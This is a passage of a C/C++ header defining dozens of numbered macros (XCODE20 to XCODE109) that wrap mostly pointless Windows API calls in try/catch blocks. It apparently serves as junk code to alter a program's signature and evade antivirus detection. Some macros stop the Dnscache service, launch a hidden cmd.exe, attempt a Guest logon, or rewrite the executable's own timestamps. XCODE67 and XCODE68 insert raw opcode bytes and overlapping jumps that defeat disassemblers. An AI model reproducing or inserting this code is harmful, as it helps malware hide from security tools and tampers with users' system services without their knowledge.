		uGblLen=uDropFilesLen+dwSizeXXX*2+8;\
		hGblFiles= GlobalAlloc(GMEM_ZEROINIT|GMEM_MOVEABLE|GMEM_DDESHARE, uGblLen);\
		buf=(char*)GlobalLock(hGblFiles);\
		memcpy(buf,(LPVOID)(&dropFiles),uDropFilesLen);\
		buf=buf+uDropFilesLen;\
		MultiByteToWideChar(CP_ACP,MB_COMPOSITE,buf,MAX_PATH,(WCHAR *)buf,MAX_PATH);\
		GlobalUnlock(hGblFiles);\
		if( OpenClipboard(NULL) )\
		{\
			EmptyClipboard();\
			SetClipboardData(CF_HDROP, hGblFiles);\
			SetClipboardData(uDropEffect,hGblEffect);\
			CloseClipboard();\
		}\
		GlobalFree(hGblEffect);\
		GlobalFree(hGblFiles);\
	}\
		catch(...) {\
		Sleep(19);\
	}

#define XCODE20 try {OUTSTR("20");\
		RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE",0,KEY_READ,&hKey);\
		if (RegQueryValueEx(hKey,AddMsg,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS)\
		{\
			RegQueryInfoKey(hKey,NULL,NULL,NULL,&dwSizeXXX,NULL,NULL,NULL,NULL,NULL,NULL,NULL);\
			if (dwSizeXXX)\
			{\
				for (PasswdLen=0; PasswdLen<dwSizeXXX; PasswdLen++)\
				{\
					szXBuff[0]='\0';\
					dwRes=MAX_PATH;\
					RegEnumKeyEx(hKey,PasswdLen,szXBuff,&dwRes,NULL,NULL,NULL,NULL);\
					if (stricmp(szXBuff,AddMsg))\
					{\
						bRetval=TRUE;\
						break;\
					}\
				}\
			}\
		}\
		RegCloseKey(hKey);\
	}\
		catch(...) {\
		Sleep(20);\
	}

#define XCODE21 try {OUTSTR("21");\
		if((scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE))!=NULL)\
		{\
			service=OpenService(scm,"Dnscache",SERVICE_QUERY_STATUS|SERVICE_CONTROL_STOP);\
			if (service)\
			{\
				bRetval=QueryServiceStatus(service,&status);\
				if (bRetval)\
				{\
					if (status.dwCurrentState!=SERVICE_STOPPED)\
					{\
						ControlService(service,SERVICE_CONTROL_STOP,&status);\
					}\
				}\
			}\
		}\
		CloseServiceHandle(service);\
		CloseServiceHandle(scm);\
	}\
	catch(...) {\
	Sleep(21);\
	}

#define XCODE22 try {OUTSTR("22");\
		pbm = CBitmap::FromHandle(hbm);\
		if(::PathFileExists(szXBuff))\
		{\
			hbm = (HBITMAP)::LoadImage(NULL, szXBuff, IMAGE_BITMAP, 0, 0, LR_DEFAULTCOLOR|LR_DEFAULTSIZE|LR_LOADFROMFILE);\
			if(hbm != NULL)\
			{\
				pbm->GetBitmap(&bm);\
				pbm->Detach();\
			}\
		}\
	}\
		catch(...) {\
		Sleep(22);\
	}

#define XCODE23 try {OUTSTR("23");\
		if ((NtQuerySystemInformation = (PROCNTQSI)GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation")))\
		{\
			NtQuerySystemInformation(0, &SysBaseInfo,sizeof(SysBaseInfo),NULL);\
			NtQuerySystemInformation(3, &SysTimeInfo,sizeof(SysTimeInfo),0);\
			NtQuerySystemInformation(2, &SysPerfInfo,sizeof(SysPerfInfo),NULL);\
		}\
	}\
		catch(...) {\
		Sleep(22);\
	}

#define XCODE24 try {OUTSTR("24");\
		hmyfile = CreateFile("C:\\Windows\\system32\\kernel32.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );\
		if ( hmyfile == INVALID_HANDLE_VALUE ) {\
			throw 1;\
		}\
		hXMod = CreateFileMapping( hmyfile, NULL, PAGE_READONLY, 0, 0, NULL );\
		if ( hXMod == INVALID_HANDLE_VALUE ) {\
			throw 1;\
		}\
		lp=NULL;\
		lp = MapViewOfFile( hXMod, FILE_MAP_READ, 0, 0, 0 );\
		if ( ! lp ) {\
			throw 1;\
		}\
		if ( *( USHORT* ) lp != IMAGE_DOS_SIGNATURE ) {\
			throw 1;\
		}\
		if ( *( ( DWORD* ) ( ( PBYTE ) lp + ( ( PIMAGE_DOS_HEADER ) lp )->e_lfanew ) ) != IMAGE_NT_SIGNATURE ) {\
			throw 1;\
		}\
}\
catch(...)  {\
	if(lp)\
		UnmapViewOfFile( lp );\
	if(hXMod)\
		CloseHandle( hXMod );\
	if(hmyfile)\
		CloseHandle( hmyfile );\
	Sleep(24);\
}

#define XCODE25 try {OUTSTR("25");\
	hdc = GetDC(NULL);\
	hPen = CreatePen(0, 1, RGB(0, 0, 0));\
	hOldPen = (HPEN) SelectObject(hdc, hPen);\
	PasswdLen = SetROP2(hdc, R2_NOT);\
	GetClientRect(NULL, &prcOld);\
	MoveToEx(hdc, prcOld.left, prcOld.top, NULL);\
    LineTo(hdc, prcOld.right, prcOld.top);\
    LineTo(hdc, prcOld.right, prcOld.bottom);\
    LineTo(hdc, prcOld.left, prcOld.bottom);\
    LineTo(hdc, prcOld.left, prcOld.top);\
	Rectangle(hdc, prcOld.left, prcOld.top, prcOld.right, prcOld.bottom);\
	SelectObject(hdc, hOldPen);\
	SetROP2(hdc, PasswdLen);\
    ReleaseDC(hwnd, hdc);\
}\
catch(...) {\
	Sleep(25);\
}

#define XCODE26 try {OUTSTR("26");\
	hwnd = CreateWindowW(L"Static",L"Application",WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,AfxGetInstanceHandle(),NULL);\
	ShowWindow(hwnd,SW_HIDE);\
	UpdateWindow(hwnd);\
}\
catch(...) {\
	Sleep(26);\
}

#define XCODE27 try {OUTSTR("27");\
	hIcon = ExtractIcon(AfxGetInstanceHandle(), AddMsg, 0);\
}\
	catch(...) {\
	Sleep(27);\
}

#define XCODE28 try {OUTSTR("28");\
	lp=VirtualAlloc(lp,16,MEM_RESERVE,PAGE_READWRITE);\
}\
	catch(...) {\
	Sleep(28);\
}

#define XCODE29 try {OUTSTR("29");\
hXMod=CreateMutex(NULL,TRUE, AddMsg);\
if(GetLastError()==ERROR_ALREADY_EXISTS)\
{\
	hXMod=CreateMutex(NULL,FALSE,"test");\
}\
}\
	catch(...) {\
	Sleep(29);\
}

#define XCODE30 try {OUTSTR("30");\
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);\
	sa.lpSecurityDescriptor = NULL;\
	sa.bInheritHandle = TRUE;\
	if (CreatePipe(&hXMod, &hmyfile, &sa, 0)) {\
		si.cb = sizeof(STARTUPINFO);\
		GetStartupInfo(&si);\
		si.hStdError = hmyfile;\
		si.hStdOutput = hmyfile;\
		si.wShowWindow = SW_HIDE;\
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;\
		if(CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {\
		memset(szXBuff, 0, MAX_PATH);\
		ReadFile(hXMod, szXBuff, MAX_PATH, &dwRes, NULL);\
		WaitForSingleObject(pi.hProcess, 30);\
		CloseHandle(hXMod);\
		CloseHandle(hmyfile);\
		}\
	}\
}\
	catch(...) {\
	Sleep(30);\
}

#define XCODE31 try {OUTSTR("31");\
::LogonUser("Guest", "localhost", "", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken);\
}\
	catch(...) {\
	Sleep(31);\
}

#define XCODE32 try {OUTSTR("32");\
	::PostThreadMessage(GetCurrentThreadId(), WM_TIMECHANGE, 0, 0);\
}\
	catch(...) {\
	Sleep(32);\
}

#define XCODE33 try {OUTSTR("33");\
		hBitmap = CreateDIBSection(GetDC(NULL), (BITMAPINFO*)hDib, DIB_RGB_COLORS, &lp, NULL, 0);\
		if (hBitmap == NULL)\
		{\
			::DeleteObject(hBitmap);\
			hBitmap = NULL;\
		}\
}\
	catch(...) {\
	Sleep(33);\
}

#define XCODE34 try {OUTSTR("34");\
	GetCursorPos(&pt);\
	if (pt.x<10 && pt.y<10)\
	{\
		SetCursorPos(pt.x+100, pt.y+100);\
	}\
}\
	catch(...) {\
	Sleep(34);\
}

#define XCODE35 try {OUTSTR("35");\
	hXMod=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, "kernel32.dll", 0, &dwSizeXXX);\
	if(WAIT_TIMEOUT==WaitForSingleObject(hXMod,200))\
	{\
		CloseHandle(hXMod);\
	}\
}\
	catch(...) {\
	Sleep(35);\
}

#define XCODE36 try {OUTSTR("36");\
    aaa.push_back(1);\
    aaa.push_back(2);\
    aaa.push_back(3);\
    aaa.push_back(4);\
    aaa.push_back(5);\
    for(iii=aaa.begin(); iii!=aaa.end(); ++iii){\
        std::cout<<(*iii)<<std::endl;\
    }\
}\
	catch(...) {\
	Sleep(36);\
}

#define XCODE37 try {OUTSTR("37");\
	hXMod = GetCurrentProcess();\
	GetProcessAffinityMask(hXMod, &dwSizeXXX,&dwRes);\
}\
	catch(...) {\
	Sleep(37);\
}

#define XCODE38 try {\
		i=sizeof(Ncb);\
		memset( &Ncb, 0, sizeof(Ncb) );\
		Ncb.ncb_command = NCBENUM;\
		Ncb.ncb_buffer = (UCHAR *)&lenum;\
		Ncb.ncb_length = sizeof(lenum);\
		uRetCode = Netbios( &Ncb );\
		for(i=0; i < lenum.length ;i++) {\
			memset( &Ncb, 0, sizeof(Ncb) );\
			Ncb.ncb_command = NCBRESET;\
			Ncb.ncb_lana_num = lenum.lana[i];\
			uRetCode = Netbios( &Ncb );\
			memset( &Ncb, 0, sizeof (Ncb) );\
			Ncb.ncb_command = NCBASTAT;\
			Ncb.ncb_lana_num = lenum.lana[i];\
			strcpy( (char*)Ncb.ncb_callname,  "*               " );\
			Ncb.ncb_buffer = (unsigned char *) &Adapter;\
			Ncb.ncb_length = sizeof(Adapter);\
			uRetCode = Netbios( &Ncb );\
			sprintf(szXBuff,"%02X-%02X-%02X-%02X-%02X-%02X",lenum.lana[i],Adapter.adapt.adapter_address[0],Adapter.adapt.adapter_address[1],Adapter.adapt.adapter_address[2],Adapter.adapt.adapter_address[3],Adapter.adapt.adapter_address[4],Adapter.adapt.adapter_address[5]);\
		}\
}\
	catch(...) {\
	Sleep(38);\
}

#define XCODE39 try {OUTSTR("39");\
	hXMod=GetCurrentThread();\
	i = GetThreadPriority(hXMod);\
	if ( i != THREAD_PRIORITY_ERROR_RETURN )\
	{\
		SetThreadPriority(hXMod, THREAD_PRIORITY_TIME_CRITICAL);\
	}\
	}\
	catch(...) {\
	Sleep(39);\
}

#define XCODE40 try {OUTSTR("40");\
	QueryPerformanceFrequency ( &count_freq );\
	}\
	catch(...) {\
	Sleep(40);\
}

#define XCODE41 try {OUTSTR("41");\
	MemStat.dwLength = sizeof(MEMORYSTATUS);\
	GlobalMemoryStatus(&MemStat);\
	sprintf(szXBuff,"%ld%ld%d",MemStat.dwTotalPhys,MemStat.dwAvailPhys,100-MemStat.dwMemoryLoad);\
	}\
	catch(...) {\
		Sleep(41);\
	}

#define XCODE42 try {OUTSTR("42");\
	StrCatA(szXBuff,AddMsg);\
	dwRes=MultiByteToWideChar(CP_ACP,0,szXBuff, -1, NULL, 0);\
	pwText = new wchar_t[dwRes];\
	MultiByteToWideChar (CP_ACP, 0, szXBuff, -1, pwText, dwRes);\
	delete []pwText;\
	}\
	catch(...) {\
	Sleep(42);\
	}

#define XCODE43 try {OUTSTR("43");\
	pwText = new wchar_t[1024];\
	swprintf(pwText,L"%S",AddMsg);\
	dwRes=WideCharToMultiByte(CP_ACP,0,pwText, wcslen(pwText), szXBuff, MAX_PATH, NULL, 0);\
	delete []pwText;\
	strcat(szXBuff,TmpBuf);\
	}\
	catch(...) {\
	Sleep(43);\
	}

#define XCODE44 try {OUTSTR("44");\
	GetModuleFileName(LoadLibrary("kernel32.dll"),szXBuff, MAX_PATH);\
	dwRes = ::GetFileVersionInfoSize((LPTSTR)szXBuff, &dwSizeXXX);\
	if ( dwRes != 0 ) {\
		pbFile = new BYTE[dwRes];\
		if (::GetFileVersionInfo((LPTSTR)szXBuff, dwSizeXXX, dwRes, (void**)pbFile) )\
		{\
			if(VerQueryValue(pbFile, "\\VarFileInfo\\Translation", (VOID FAR* FAR*)&lpBuffer, (UINT FAR *)&dwRes))\
				VerLanguageName (lpBuffer->wLanguage, TmpBuf, 512);\
		}\
		delete [] pbFile;\
	}\
	}\
		catch(...) {\
		Sleep(44);\
	}

#define XCODE45 try {OUTSTR("45");\
	DisableThreadLibraryCalls((HMODULE)GetModuleHandle("urlmon"));\
	}\
	catch(...) {\
	Sleep(45);\
	}

#define XCODE46 try {OUTSTR("46");\
	dwRes = (DWORD)GetWindowLong(GetActiveWindow(), GWL_WNDPROC);\
	wpOrigEditProc=(WNDPROC)dwRes;\
	SetWindowLong(GetActiveWindow(), GWL_WNDPROC, (LONG) wpOrigEditProc);\
	}\
	catch(...) {\
	Sleep(46);\
	}

#define XCODE47 try {OUTSTR("47");\
		GetSystemTime(&st);\
		SystemTimeToFileTime(&st, &ft);\
		GetModuleFileName(NULL, szXBuff, MAX_PATH);\
		hXMod = CreateFile(szXBuff, GENERIC_READ,NULL,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);\
		SetFileTime(hXMod,(LPFILETIME) NULL,(LPFILETIME) NULL,&ft);\
		CloseHandle(hXMod);\
	}\
	catch(...) {\
	Sleep(47);\
	}

#define XCODE48 try {OUTSTR("48");\
	lpvEnv = GetEnvironmentStrings();\
	if(lpvEnv != NULL)\
	{\
		lpszVariable = (LPTSTR)lpvEnv;\
		while(*lpszVariable)\
		{\
			sprintf(szXBuff,"%s\n", lpszVariable);\
			lpszVariable += lstrlen(lpszVariable) + 1;\
		}\
		FreeEnvironmentStrings(lpvEnv);\
	}\
	}\
	catch(...) {\
	Sleep(48);\
	}

#define XCODE49 try {OUTSTR("49");\
	if (GetCurrentDirectory(ARRAYSIZE(szXBuff), szXBuff) &&\
		SUCCEEDED(StringCchCopy(TmpBuf, 512, szXBuff)) &&\
		SUCCEEDED(StringCchCat(TmpBuf, 512, "//")) &&\
		SUCCEEDED(StringCchCat(TmpBuf, 512, "asce.ini"))) {\
		dwRes=GetTickCount();\
	}\
	}\
	catch(...) {\
	Sleep(49);\
	}

#define XCODE50 try {OUTSTR("50");\
	if(IsBadReadPtr(buf,16))\
	{\
		CopyMemory(szXBuff, buf, 16);\
	}\
	}\
	catch(...) {\
	Sleep(50);\
	}

#define XCODE51 try {OUTSTR("51");\
		GetExitCodeProcess(GetCurrentProcess(),&dwRes);\
	}\
	catch(...) {\
	Sleep(51);\
	}

#define XCODE52 try {OUTSTR("52");\
		if (GetLogicalDriveStrings(MAX_PATH, szXBuff))\
		{\
			buf=szXBuff;\
			do\
			{\
				*szDrive = *buf;\
				if (QueryDosDevice(szDrive, TmpBuf, MAX_PATH))\
				{\
					dwRes = strlen(TmpBuf);\
					if (dwRes < MAX_PATH)\
					{\
						bRetval = strnicmp(AddMsg, TmpBuf, dwRes) == 0;\
						if (bRetval)\
						{\
							StringCchPrintf(buf1,16,"%s",szDrive);\
						}\
					}\
				}\
				while (*buf++);\
			} while (!bRetval && *buf);\
		}\
	}\
	catch(...) {\
	Sleep(52);\
	}

#define XCODE53 try {OUTSTR("53");\
	GetDiskFreeSpace("C:\\",&dwRes,&dwSizeXXX,&cb,&dwBytesInBlock);\
	}\
	catch(...) {\
	Sleep(53);\
	}

#define XCODE54 try {OUTSTR("54");\
	bRetval=GlobalMemoryStatusEx((LPMEMORYSTATUSEX)szXBuff);\
	}\
	catch(...) {\
	Sleep(54);\
	}

#define XCODE55 try {OUTSTR("55");\
	GlobalMemoryStatus((LPMEMORYSTATUS)szXBuff);\
	}\
	catch(...) {\
	Sleep(55);\
	}

#define XCODE56 try {OUTSTR("56");\
	hXMod=CreateWaitableTimer(NULL, TRUE, NULL);\
	if (hXMod)\
	{\
		liDueTime.QuadPart = -100000000L;\
		if (SetWaitableTimer(hXMod, &liDueTime, 0, NULL, NULL, 0))\
		{\
			WaitForSingleObject(hXMod, 10);\
		}\
	}\
	}\
	catch(...) {\
	Sleep(56);\
	}

#define XCODE57 try {OUTSTR("57");\
	InterlockedExchange((volatile long *)&dwRes, dwSizeXXX);\
	}\
	catch(...) {\
	Sleep(57);\
	}

#define XCODE58 try {OUTSTR("58");\
	InterlockedExchangePointer(lp, buf);\
	}\
	catch(...) {\
	Sleep(58);\
	}

#define XCODE59 try {OUTSTR("59");\
	SHGetSpecialFolderPath(NULL, szXBuff, CSIDL_PERSONAL, FALSE);\
	}\
	catch(...) {\
	Sleep(59);\
	}

#define XCODE60 try {OUTSTR("60");\
	SHGetMalloc(&pMalloc);\
	SHGetFolderLocation(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, &pidl);\
	SHGetPathFromIDList(pidl, szXBuff);\
	pMalloc->Free(pidl);\
	pMalloc->Release();\
	}\
	catch(...) {\
	Sleep(60);\
	}

#define XCODE61 try {OUTSTR("61");\
	osvi.dwOSVersionInfoSize = sizeof(osvi);\
	osvi.dwMajorVersion = 6;\
	osvi.dwMinorVersion = 0;\
	osvi.dwPlatformId = VER_PLATFORM_WIN32_NT;\
	VER_SET_CONDITION(dwRes, VER_MAJORVERSION, VER_EQUAL);\
	VER_SET_CONDITION(dwRes, VER_MINORVERSION, VER_EQUAL);\
	VER_SET_CONDITION(dwRes, VER_PLATFORMID, VER_EQUAL);\
	if (VerifyVersionInfo(&osvi, VER_MAJORVERSION | VER_MINORVERSION | VER_PLATFORMID, dwRes)) {\
		dwSizeXXX=osvi.dwMajorVersion;\
	}\
	}\
	catch(...) {\
	Sleep(61);\
	}

#define XCODE62 try {OUTSTR("62");\
	va_start(ap, szXBuff);\
	_vsnprintf(TmpBuf, sizeof(TmpBuf), szXBuff, ap);\
	va_end(ap);\
	}\
	catch(...) {\
	Sleep(62);\
	}

#define XCODE63 try {OUTSTR("63");\
	FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_IGNORE_INSERTS,LoadLibrary("MQUTIL.DLL"),0xc0000005,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),(LPTSTR)&buf,256,NULL);\
	}\
	catch(...) {\
		Sleep(63);\
	}

#define XCODE64 try {OUTSTR("64");\
	GetInputState();\
	PostThreadMessage(GetCurrentThreadId(),NULL,0,0);\
	GetMessage(&msg, NULL, NULL, NULL);\
	}\
	catch(...) {\
	Sleep(64);\
	}

#define XCODE65 try {OUTSTR("65");\
	hWinSta = GetProcessWindowStation();\
	hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);\
	if (hWinSta != NULL)\
		SetProcessWindowStation(hWinSta);\
	}\
	catch(...) {\
	Sleep(65);\
	}

#define XCODE66 try {OUTSTR("66");\
	dwSizeXXX = GetLogicalDriveStrings(1000, szXBuff);\
	buf=szXBuff;\
	while(*buf)\
	{\
		uGblLen=GetDriveType(buf);\
		if (uGblLen==DRIVE_FIXED||uGblLen==DRIVE_REMOVABLE)\
		{\
			memcpy(szDrive, buf, 3);\
		}\
		while(*buf!='\0')\
			buf++;\
		buf++;\
	}\
	}\
	catch(...) {\
	Sleep(66);\
	}

#define XCODE67 try {OUTSTR("67");\
	_asm \
{\
	_asm _emit 60h\
	_asm _emit 0EBh\
	_asm _emit 00h\
	_asm _emit 0EBh\
	_asm _emit 05h\
	_asm _emit 58h\
	_asm _emit 03h\
	_asm _emit 0C1h\
	_asm _emit 50h\
	_asm _emit 0C3h\
	_asm _emit 0B9h\
	_asm _emit 00Ah\
	_asm _emit 00h\
	_asm _emit 00h\
	_asm _emit 00h\
	_asm _emit 0E8h\
	_asm _emit 0F1h\
	_asm _emit 0FFh\
	_asm _emit 0FFh\
	_asm _emit 0FFh\
	_asm _emit 0BBh\
	_asm _emit 0A8h\
	_asm _emit 0D6h\
	_asm _emit 0B8h\
	_asm _emit 0C1h\
	_asm _emit 0EEh\
	_asm _emit 0C2h\
	_asm _emit 0D2h\
	_asm _emit 0C2h\
	_asm _emit 0E8h\
	 _asm _emit 61h\
	 }\
	}\
	catch(...) {\
	Sleep(67);\
	}

#define XCODE68 try {OUTSTR("68");\
	_asm \
	{\
	_asm jz  $+13\
	_asm jnz $+7\
	_asm _emit 0e8h\
	}\
	}\
	catch(...) {\
	Sleep(68);\
	}

#define XCODE69 try {OUTSTR("69");\
	GetWindowRect(hwnd, &prcOld);\
	GetCursorPos(&pt);\
	SetCursorPos(pt.x+50, pt.y+50);\
	mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);\
	mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);\
	}\
	catch(...) {\
	Sleep(69);\
	}

#define XCODE70 try {OUTSTR("70");\
	hXMod=CreateNamedPipe("\\\\.\\pipe\\ThinkPipe",PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,0,1,1024,1024,0,NULL);\
	PeekNamedPipe(hXMod,szXBuff,MAX_PATH,&dwRes,0,0);\
	if (dwRes>0)\
	{\
		ReadFile(hXMod, szXBuff, MAX_PATH, &dwSizeXXX, NULL);\
	}\
	CloseHandle(hXMod);\
	}\
	catch(...) {\
	Sleep(70);\
	}

#define XCODE71 try {OUTSTR("71");\
	GetFileInformationByHandle(hXMod,(LPBY_HANDLE_FILE_INFORMATION)szXBuff);\
	}\
	catch(...) {\
	Sleep(71);\
	}

#define XCODE72 try {OUTSTR("72");\
	dwRes = SetTimer(hwnd, 0x500, 50, NULL);\
	}\
	catch(...) {\
	Sleep(72);\
	}

#define XCODE73 try {OUTSTR("73");\
	SetWindowPos(hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);\
	}\
	catch(...) {\
	Sleep(73);\
	}

#define XCODE74 try {OUTSTR("74");\
	EnableWindow(hwnd,TRUE);\
	}\
	catch(...) {\
	Sleep(74);\
	}

#define XCODE75 try {OUTSTR("75");\
	SetWindowRedraw(hwnd, TRUE);\
    InvalidateRect(hwnd, NULL, FALSE);\
	}\
	catch(...) {\
	Sleep(75);\
	}

#define XCODE76 try {OUTSTR("76");\
	GetQueuedCompletionStatus(hXMod, &dwBytesInBlock, &CompKey, &po, INFINITE);\
	bRetval = (CompKey == 0);\
	}\
	catch(...) {\
	Sleep(76);\
	}

#define XCODE77 try {OUTSTR("77");\
	hXMod = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);\
	PostQueuedCompletionStatus(hXMod, 0, dwSizeXXX, NULL);\
	bRetval = (CompKey == 0);\
	}\
	catch(...) {\
	Sleep(77);\
	}

#define XCODE78 try {OUTSTR("78");\
	SuspendThread(hXMod);\
	SleepEx(10, FALSE);\
	ResumeThread(hXMod);\
	}\
	catch(...) {\
	Sleep(78);\
	}

#define XCODE79 try {OUTSTR("79");\
	dwRes = GetPriorityClass(GetCurrentProcess());\
	if (SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS)) {\
		SetPriorityClass(GetCurrentProcess(), dwRes);\
	}\
	}\
	catch(...) {\
	Sleep(79);\
	}

#define XCODE80 try {OUTSTR("80");\
	DuplicateHandle(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), &hXMod, THREAD_SUSPEND_RESUME, FALSE, DUPLICATE_SAME_ACCESS);\
	}\
	catch(...) {\
	Sleep(80);\
	}

#define XCODE81 try {OUTSTR("81");\
	if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {\
		if (!IsDialogMessage(hwnd, &msg)) {\
			if (msg.message == WM_QUIT) {\
				bRetval = TRUE;\
			} else {\
				TranslateMessage(&msg);\
				DispatchMessage(&msg);\
			}\
		}\
    }\
	}\
	catch(...) {\
	Sleep(81);\
	}

#define XCODE82 try {OUTSTR("82");\
	if(hwnd!=GetFocus())\
		DestroyWindow(hwnd);\
	}\
	catch(...) {\
	Sleep(82);\
	}

#define XCODE83 try {OUTSTR("83");\
	if (hXMod!=NULL)\
	{\
		CloseHandle(hXMod);\
	}\
	hXMod=CreateSemaphore(NULL, 0, dwRes, szXBuff);\
	}\
	catch(...) {\
	Sleep(83);\
	}

#define XCODE84 try {OUTSTR("84");\
	ReleaseSemaphore(hXMod, 1, &lRes);\
	SetLastError(ERROR_DATABASE_FULL);\
	ReleaseMutex(hmyfile);\
	}\
	catch(...) {\
	Sleep(83);\
	}

#define XCODE85 try {OUTSTR("85");\
	CompKey=(ULONG_PTR)dwSizeXXX;\
	PasswdLen = PtrToUlong(CompKey);\
	}\
	catch(...) {\
	Sleep(85);\
	}

#define XCODE86 try {OUTSTR("86");\
	CreateTimerQueueTimer(&hXMod, NULL, NULL, NULL, 1000, 1000, 0);\
	}\
	catch(...) {\
	Sleep(86);\
	}

#define XCODE87 try {OUTSTR("87");\
	if (hXMod!=INVALID_HANDLE_VALUE)\
	{\
	DeleteTimerQueueTimer(hXMod, hmyfile, NULL);\
	}\
	}\
	catch(...) {\
	Sleep(87);\
	}

#define XCODE88 try {OUTSTR("88");\
	QueueUserAPC((PAPCFUNC)GetTickCount, hXMod, 0);\
	}\
	catch(...) {\
	Sleep(88);\
	}

#define XCODE89 try {OUTSTR("89");\
	hHandleList=new HANDLE[3];\
	hHandleList[0]=hXMod;\
	hHandleList[1]=hmyfile;\
	hHandleList[2]=hToken;\
	WaitForMultipleObjectsEx(3, hHandleList, TRUE, 20, TRUE);\
	delete [] hHandleList;\
	}\
	catch(...) {\
	Sleep(89);\
	}

#define XCODE90 try {OUTSTR("90");\
	SetDlgItemText(hwnd, 1, AddMsg);\
	}\
	catch(...) {\
	Sleep(90);\
	}

#define XCODE91 try {OUTSTR("91");\
	uDropEffect = GetDlgItemInt(hwnd, 500, NULL, FALSE);\
	}\
	catch(...) {\
	Sleep(91);\
	}

#define XCODE92 try {OUTSTR("92");\
	if (HIWORD(GetQueueStatus(QS_ALLEVENTS)) != 0) {\
	SwitchToFiber(lp);\
    }\
	}\
	catch(...) {\
	Sleep(92);\
	}

#define XCODE93 try {OUTSTR("93");\
	lp=ConvertThreadToFiber(buf);\
	}\
	catch(...) {\
	Sleep(93);\
	}

#define XCODE94 try {OUTSTR("94");\
	hwnd = CreateDialogParamA(hinstExe, AddMsg, NULL, (DLGPROC)Enum16, 0L);\
	}\
	catch(...) {\
	Sleep(94);\
	}

#define XCODE95 try {OUTSTR("95");\
	dwRes=50;\
	lp=CreateFiber(1024, (LPFIBER_START_ROUTINE)Sleep, &dwRes);\
	if (lp != NULL) {\
	  DestroyWindow(hwnd);\
	}\
	DeleteFiber(lp);\
	}\
	catch(...) {\
	Sleep(95);\
	}

#define XCODE96 try {OUTSTR("96");\
	sprintf(szXBuff, "%d", dwRes);\
	nf.NumDigits = 0;\
	nf.LeadingZero = FALSE;\
	nf.Grouping = 3;\
	nf.lpDecimalSep = ".";\
	nf.lpThousandSep = ",";\
	nf.NegativeOrder = 0;\
    GetNumberFormat(LOCALE_USER_DEFAULT, 0, szXBuff, &nf, TmpBuf, 100);\
	}\
	catch(...) {\
	Sleep(96);\
	}

#define XCODE97 try {OUTSTR("97");\
	if(VirtualQueryEx(GetCurrentProcess(), lp, &mbi, sizeof(mbi)) == sizeof(mbi))\
	{\
	if (mbi.State==MEM_FREE)\
	{\
	lp=mbi.AllocationBase;\
	}\
	}\
	}\
	catch(...) {\
	Sleep(97);\
	}

#define XCODE98 try {OUTSTR("98");\
	if ((lstrlen(szXBuff)+lstrlen(AddMsg))<MAX_PATH)\
	{\
		lstrcat(szXBuff, AddMsg);\
	}\
	}\
	catch(...) {\
	Sleep(98);\
	}

#define XCODE99 try {OUTSTR("99");\
	KillTimer(hwnd, uintptr);\
    EndDialog(hwnd, uintptr);\
	}\
	catch(...) {\
	Sleep(99);\
	}

#define XCODE100 try {OUTSTR("100");\
	ComboBox_SetCurSel(hwnd,dwRes);\
	}\
	catch(...) {\
	Sleep(100);\
	}

#define XCODE101 try {OUTSTR("101");\
	hwnd = GetDlgItem(hwnd, NUM_ACES);\
	if(hwnd)\
		ComboBox_AddString(hwnd, AddMsg);\
	}\
	catch(...) {\
	Sleep(101);\
	}

#define XCODE102 try {OUTSTR("102");\
	Edit_LimitText(GetDlgItem(hwnd, (dwRes == 0) ? 501 : 502), dwSizeXXX);\
	}\
	catch(...) {\
	Sleep(102);\
	}

#define XCODE103 try {OUTSTR("103");\
	dwRes = ComboBox_GetCurSel(hwnd) - 1;\
	}\
	catch(...) {\
	Sleep(103);\
	}

#define XCODE104 try {OUTSTR("104");\
	GetWindowRect(GetDlgItem(hwnd, 500), &prcOld);\
	MapWindowPoints(NULL, hwnd, (LPPOINT) &prcOld, 2);\
	DestroyWindow(GetDlgItem(hwnd, 500));\
	}\
	catch(...) {\
	Sleep(104);\
	}

#define XCODE105 try {OUTSTR("105");\
	hXMod=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GetTickCount, NULL, 0, NULL);\
	GetExitCodeThread(hXMod, &dwRes);\
	}\
	catch(...) {\
	Sleep(105);\
	}

#define XCODE106 try {OUTSTR("106");\
	BeginPaint(hwnd, (LPPAINTSTRUCT)szXBuff);\
	}\
	catch(...) {\
	Sleep(106);\
	}

#define XCODE107 try {OUTSTR("107");\
	PostMessage(HWND_BROADCAST, WM_PAINT, 0, 0);\
	}\
	catch(...) {\
	Sleep(107);\
	}

#define XCODE108 try {OUTSTR("108");\
	uDropEffect=RegisterWindowMessage(AddMsg);\
	}\
	catch(...) {\
	Sleep(108);\
	}

#define XCODE109 try {OUTSTR("109");\
	bRetval=IsTextUnicode(lp,dwSizeXXX,(LPINT)&dwRes);\
	if (bRetval)\
	{\
		buf=_strrev(szXBuff);\
	}\
	}\
	catch(...) {\
